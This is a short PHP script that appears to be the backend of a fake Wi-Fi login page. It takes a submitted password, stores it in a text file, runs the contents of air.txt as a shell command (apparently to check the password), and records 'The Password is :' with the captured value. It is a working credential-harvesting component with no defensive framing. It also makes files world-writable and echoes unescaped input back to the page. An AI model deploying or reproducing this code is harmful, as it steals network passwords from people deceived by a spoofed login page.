<?php


if($_SERVER["REQUEST_METHOD"] === "POST"){
    $password = $_POST["password"];

    $handle = fopen("pass_check.txt", "w+");

    chmod("pass_check.txt", 0777);
    chmod("air.txt", 0777);
    $air = file_get_contents("air.txt");
    
   
    fwrite( $handle , "$password");
$check = shell_exec("$air");
echo $password;

if($check == ""){
    header("Location: wrong.php");
    exit;

} else {
   file_put_contents("pass_check.txt", "The Password is :"."$password");
   header("Location: true.php");
 
}


fclose($handle);


}
?>
